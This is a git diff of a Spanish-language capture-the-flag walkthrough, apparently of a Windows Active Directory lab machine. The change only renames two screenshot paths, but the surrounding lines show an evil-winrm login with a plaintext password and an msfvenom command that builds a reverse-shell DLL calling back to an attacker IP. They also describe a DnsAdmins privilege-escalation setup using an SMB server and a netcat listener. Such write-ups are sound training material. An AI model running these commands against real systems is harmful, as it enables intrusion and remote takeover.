@@ -116,7 +116,7 @@ Con las credenciales de ryan nos conectamos por `evil-winrm` y comprobamos a qu�
 evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
-![Grupos de ryan](Imagenes/task7_ryan.png)
+![Grupos de ryan](Imagenes/Task7_ryan.png)
 
 Ryan pertenece al grupo **MEGABANK\Contractors**, y este a su vez es miembro de **MEGABANK\DnsAdmins**. `DnsAdmins` es un grupo estándar y predeterminado de Active Directory (se crea junto con el rol DNS al instalarlo en un Domain Controller), cuyo propósito es delegar la administración del servicio DNS del propio DC.
 
@@ -148,7 +148,7 @@ Primero generamos una DLL maliciosa con `msfvenom` que nos abra una reverse shel
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.98 LPORT=443 -f dll -o mal_dns.dll
 ```
 
-![Generación de la DLL maliciosa](Imagenes/task8_msfvenom.png)
+![Generación de la DLL maliciosa](Imagenes/Task8_buen_payload.png)
 
 Levantamos un servidor SMB con impacket para servir la DLL, y un listener con netcat para recibir la conexión:
 
